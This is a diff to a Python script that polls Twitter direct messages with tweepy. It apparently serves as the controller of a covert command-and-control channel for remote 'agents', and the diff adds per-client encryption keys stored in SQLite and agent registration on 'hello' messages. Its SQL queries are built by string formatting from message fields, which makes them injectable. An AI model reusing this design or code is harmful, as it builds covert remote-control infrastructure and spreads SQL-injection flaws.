@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import tweepy, os, base64, _thread, sqlite3, time
+import tweepy, os, base64, _thread, sqlite3, time, uuid
 from ast import literal_eval
 from subprocess import Popen, PIPE
 from termcolor import colored as c
@@ -23,12 +23,36 @@ def fail(msg): return "[%s] : %s" % (c("FAILED","red"),msg)
 def ok(msg): return "[  %s  ] : %s" % (c("OK","green"),msg)
 def done(msg): return "[ %s ] : %s" % (c("DONE","green"),msg)
 
+# Persistance
+db = sqlite3.connect("databse.db")
+cursor = db.cursor()
+cursor.execute("CREATE TABLE IF NOT EXISTS keys (CLIID TEXT PRIMARY KEY, KEY TEXT)")
+
+def get_cli_key(cliid):
+	res = cursor.execute("SELECT KEY FROM keys WHERE CLIID='%s'" % cliid).fetchall()
+	if len(res) == 0:
+		return False
+	return res[0][0]
+def new_cli():
+	cliid = str(uuid.uuid4())
+	key = formatting.gen_key()
+	cursor.execute("INSERT INTO keys (CLIID, KEY) VALUES ('%s','%s')" % (cliid,key))
+	return cliid, key
+def all_cliids():
+	lst = cursor.execute("SELECT CLIID FROM keys").fetchall()
+	cliids = []
+	for i in lst:
+		cliids.append(i[0])
+	return cliids
+
 # Polling
 def start_polling():
 	_thread.start_new_thread(poll.check_dms, (api, config.keys['agent_username']))
 	while True:
 		poll.sort_queue(handle_msg)
 		time.sleep(1)
+
+agents = {}
 
 # Commands and Command Handler
 man = {
@@ -91,8 +115,10 @@ def handle_message(msg):
 	key = get_cli_key(msg['cliid'])
 	pcall = msg['type']
 	pl = literal_eval(formatting.decode(msg['data'],key)) # pl = payload (the encrypted data sent with the message)
-	if pcall == "hello": pass
-		#TODO
+	if pcall == "hello":
+		name = pl['name']
+		agents[name] = msg['cliid']
+		
 
 
 
